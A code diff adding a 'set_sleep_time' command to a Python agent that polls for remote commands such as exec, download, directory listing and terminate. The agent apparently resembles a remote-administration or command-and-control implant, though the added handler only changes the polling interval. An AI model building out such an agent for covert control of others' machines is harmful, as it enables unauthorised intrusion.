@@ -158,6 +158,28 @@ def execute_list_directory_command(command_data):
         return {'status': 'error', 'error': str(e)}
 
 
+def execute_set_sleep_time_command(command_data):
+    """Change agent polling interval"""
+    global SLEEP_TIME
+    try:
+        new_sleep_time = command_data.get('sleep_time')
+        if not new_sleep_time:
+            return {'status': 'error', 'error': 'No sleep_time specified'}
+
+        # Validate sleep time
+        if not isinstance(new_sleep_time, int) or new_sleep_time < 1 or new_sleep_time > 60:
+            return {'status': 'error', 'error': 'Sleep time must be an integer between 1 and 60 seconds'}
+
+        old_sleep_time = SLEEP_TIME
+        SLEEP_TIME = new_sleep_time
+        return {
+            'status': 'success',
+            'result': f'Sleep time changed from {old_sleep_time}s to {new_sleep_time}s'
+        }
+    except Exception as e:
+        return {'status': 'error', 'error': str(e)}
+
+
 def execute_command_by_type(command):
     """Route command to appropriate handler based on type"""
     cmd_type = command.get('type', 'exec')
@@ -171,6 +193,8 @@ def execute_command_by_type(command):
         return execute_download_command(cmd_data)
     elif cmd_type == 'list_directory':
         return execute_list_directory_command(cmd_data)
+    elif cmd_type == 'set_sleep_time':
+        return execute_set_sleep_time_command(cmd_data)
     elif cmd_type == 'terminate':
         return execute_terminate_command()
     else:
